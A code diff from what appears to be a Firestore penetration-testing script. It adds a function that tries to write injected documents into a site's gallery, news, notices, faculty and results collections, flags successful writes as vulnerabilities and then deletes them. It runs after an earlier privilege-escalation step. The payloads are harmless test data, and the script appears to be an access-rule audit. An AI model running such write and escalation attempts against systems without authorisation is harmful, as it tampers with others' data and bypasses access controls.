@@ -275,8 +275,57 @@ async function attemptPrivilegeEscalation() {
   await checkCollectionRead("users");
 }
 
+// --- DASHBOARD SPECIFIC ATTACKS ---
+
+async function checkDashboardWriteAccess() {
+  console.log(`\n--- Checking Dashboard Collections (Write Access) ---`);
+  console.log("Targeting collections found in dashboard.html source...");
+
+  // Collections found in dashboard.html: gallery, results, faculty, news, notices
+  let targets = [
+    { name: "gallery", data: { title: "Test", category: "General" } },
+    {
+      name: "news",
+      data: { title: "Test News", date: "2026-01-03", summary: "Test" },
+    },
+    { name: "notices", data: { text: "Test Notice", link: "http://test.com" } },
+    { name: "faculty", data: { name: "Test Fac", role: "Test" } },
+    { name: "results", data: { title: "Test Res", url: "http://test.com" } },
+  ];
+
+  for (const t of targets) {
+    process.stdout.write(`Attempting write to '${t.name}'... `);
+    try {
+      const payload = {
+        ...t.data,
+        timestamp: new Date(),
+        author: "pentester", // injecting author field
+      };
+      const docRef = await addDoc(collection(db, t.name), payload);
+      console.log(GREEN + "SUCCESS! [vuln]" + RESET);
+      console.log(GREEN + `  -> Injected document ID: ${docRef.id}` + RESET);
+
+      // Clean up?
+      try {
+        await deleteDoc(docRef);
+        console.log("  -> Cleaned up.");
+      } catch (e) {}
+    } catch (e: any) {
+      if (e.code === "permission-denied") {
+        console.log(RED + "DENIED [SECURE]" + RESET);
+      } else {
+        console.log(YELLOW + `ERROR: ${e.code}` + RESET);
+      }
+    }
+  }
+}
+
 async function runPentest() {
+  // 1. Authenticate (Privilege Escalation function creates a user)
   await attemptPrivilegeEscalation();
+
+  // 2. Dashboard Checks
+  await checkDashboardWriteAccess();
 }
 
 runPentest();
